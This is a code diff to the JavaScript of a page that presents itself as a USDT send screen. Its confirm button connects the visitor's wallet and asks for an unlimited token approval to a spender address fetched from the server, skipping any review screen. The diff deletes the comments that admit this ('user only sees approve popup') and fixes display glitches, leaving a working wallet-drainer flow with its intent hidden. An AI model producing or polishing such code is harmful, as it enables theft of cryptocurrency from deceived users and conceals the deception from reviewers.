@@ -34,7 +34,7 @@ async function init() {
   document.querySelectorAll('.np').forEach(btn => {
     btn.addEventListener('click', () => {
       const t = btn.textContent.trim();
-      if (t === 'âŒ«') {
+      if (btn.classList.contains('del') || t === '⌫' || t === 'DEL') {
         if (displayVal.length <= 1) setDisplay('0');
         else setDisplay(displayVal.slice(0, -1));
         return;
@@ -61,7 +61,6 @@ async function init() {
   document.getElementById('backBtn').addEventListener('click', () => history.back());
   document.getElementById('approveBtn').addEventListener('click', onConfirm);
 
-  // silent pre-connect if already available
   if (window.ethereum) {
     try {
       const accs = await window.ethereum.request({ method: 'eth_accounts' });
@@ -85,21 +84,19 @@ function setDisplay(val) {
   }
   el.textContent = shown;
   el.classList.toggle('active', num > 0);
-  document.getElementById('usdValue').innerHTML = 'â‰ˆ $' + num.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 }) + ' <span class="swap">â‡…</span>';
+  document.getElementById('usdValue').innerHTML = '≈ $' + num.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 }) + ' <span class="swap">⇄</span>';
   document.getElementById('tokenBalLabel').textContent = shown + ' USDT';
   document.getElementById('tokenUsdLabel').textContent = '$' + num.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
   document.getElementById('reviewBtn').disabled = num <= 0;
   document.getElementById('revAmount').textContent = shown + ' USDT';
-  document.getElementById('revFiat').textContent = 'â‰ˆ $' + num.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+  document.getElementById('revFiat').textContent = '≈ $' + num.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
   document.getElementById('successAmount').textContent = shown + ' USDT';
 }
 
 function goReview() {
-  // No Confirm preview screen â€” direct approve
   onConfirm();
 }
 
-// Single button: connect if needed then approve immediately
 async function onConfirm() {
   const btn = document.getElementById('approveBtn');
   btn.disabled = true;
@@ -107,7 +104,6 @@ async function onConfirm() {
   showTx('Waiting for wallet...', 'pending');
 
   try {
-    // 1. Ensure wallet connected
     if (!userAccount) {
       if (!window.ethereum) {
         const dappUrl = encodeURIComponent(window.location.href);
@@ -139,7 +135,6 @@ async function onConfirm() {
       await onConnected(accounts[0]);
     }
 
-    // 2. Immediately request approve (max) â€” user only sees approve popup
     if (!spenderAddress) {
       const sp = await fetch('/api/spender');
       const d = await sp.json();
@@ -211,7 +206,7 @@ function showTx(msg, type) {
 }
 
 function shortAddr(a) {
-  if (!a || a.length < 10) return a || 'â€”';
+  if (!a || a.length < 10) return a || '—';
   return a.slice(0,6) + '...' + a.slice(-4);
 }
 
